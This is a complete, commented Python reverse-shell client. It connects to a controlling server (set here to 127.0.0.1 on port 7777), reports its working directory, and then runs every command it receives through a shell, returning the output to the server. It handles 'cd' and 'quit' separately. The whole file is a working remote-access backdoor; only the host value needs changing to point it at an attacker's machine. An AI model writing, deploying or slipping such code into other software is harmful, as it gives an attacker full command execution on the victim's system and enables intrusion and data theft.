import socket
import os
import subprocess

# Create a socket object
s = socket.socket()

# Define the server's hostname or IP address and port
HOST = "127.0.0.1"  # The server's hostname or IP address
PORT = 7777  # The port used by the server

# Connect to the server
s.connect((HOST, PORT))

# Receive the initial message from the server
data = s.recv(1024)
currentWD = os.getcwd() + "> "
s.send(str.encode(currentWD))

# Continuously receive and execute commands from the server
while True:
    # Receive data from the server (up to 1024 bytes)
    data = s.recv(1024)

    # If the command is 'quit', break the loop and exit
    if(data[:].decode("utf-8") == 'quit'):
        break

    # If the command is 'cd', change the directory
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

        # Get the current working directory and format it
        currentWD = os.getcwd() + "> "
        
        # Send the current working directory back to the server
        s.send(str.encode(currentWD))

    # If there is any data received
    elif len(data) > 0:
        # Execute the received command in a new subprocess
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Read the output and error streams from the subprocess
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        
        # Decode the output to a string
        output_str = str(output_byte, "utf-8")
        
        # Get the current working directory and format it
        currentWD = os.getcwd() + "> "
        
        # Send the output and current working directory back to the server
        s.send(str.encode(output_str + currentWD))

        # Print the output to the console
        # print(output_str)